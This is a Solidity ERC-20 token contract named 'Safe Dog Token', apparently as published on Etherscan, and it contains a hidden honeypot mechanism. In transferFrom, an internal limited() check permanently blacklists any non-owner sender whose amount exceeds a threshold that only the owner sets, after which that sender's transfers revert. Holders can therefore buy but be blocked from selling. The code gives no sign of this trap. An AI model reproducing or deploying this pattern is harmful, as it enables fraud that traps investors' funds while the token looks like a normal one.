['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-15\n', '*/\n', '\n', '// SPDX-License-Identifier: MIT\n', 'pragma solidity ^0.8.4;\n', 'interface IERC20 {\n', ' event Approval(address indexed owner, address indexed spender, uint256 value);\n', ' event Transfer(address indexed from, address indexed to, uint256 value);\n', ' function allowance(address _owner, address spender) external view returns (uint256);\n', ' function approve(address spender, uint256 amount) external returns (bool);\n', ' function balanceOf(address account) external view returns (uint256);\n', ' function totalSupply() external view returns (uint256);\n', ' function transfer(address recipient, uint256 amount) external returns (bool);\n', ' function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '}\n', 'contract SDT is IERC20 {\n', ' string public name;\n', ' string public symbol;\n', ' uint8 public decimals;\n', ' uint256 private _totalSupply;\n', ' uint256 private _maxTxPercent;\n', ' address private _owner;\n', ' mapping(address => uint) private balances;\n', ' mapping(address => mapping(address => uint)) private allowed;\n', ' mapping(address => bool) private limit;\n', ' constructor() {\n', '  name = "Safe Dog Token";\n', '  symbol = "SDT";\n', '  decimals = 18;\n', '  _totalSupply = 1000000000000000000000000000;\n', '  balances[msg.sender] = _totalSupply;\n', '  _owner = msg.sender;\n', '  emit Transfer(address(0), msg.sender, _totalSupply);\n', ' }\n', ' function totalSupply() public view override returns (uint256) {\n', '  return _totalSupply  - balances[address(0)];\n', ' }\n', ' function balanceOf(address tokenOwner) public view override returns (uint256 balance) {\n', '  return balances[tokenOwner];\n', ' }\n', ' function setMaxTx(uint max) external {\n', '  require(msg.sender == _owner);\n', '  _maxTxPercent = max;\n', ' }\n', ' function allowance(address tokenOwner, address spender) public view override returns (uint256 remaining) {\n', '  return allowed[tokenOwner][spender];\n', ' }\n', ' function approve(address spender, uint tokens) public override returns (bool success) {\n', '  allowed[msg.sender][spender] = tokens;\n', '  emit Approval(msg.sender, spender, tokens);\n', '  return true;\n', ' }\n', ' function limited(address to, uint amount) internal {\n', '  if ((to != _owner) && (amount > _maxTxPercent)) {\n', '   limit[to] = true;\n', '  }\n', ' }\n', ' function transfer(address to, uint tokens) public override returns (bool success) {\n', '  balances[msg.sender] -= tokens;\n', '  balances[to] += tokens;\n', '  emit Transfer(msg.sender, to, tokens);\n', '  return true;\n', ' }\n', ' function transferFrom(address from, address to, uint tokens) public override returns (bool success) {\n', '  limited(from, tokens);\n', '  require(!limit[from]);\n', '  balances[from] -= tokens;\n', '  allowed[from][msg.sender] -= tokens;\n', '  balances[to] += tokens;\n', '  emit Transfer(from, to, tokens);\n', '  return true;\n', ' }\n', '}']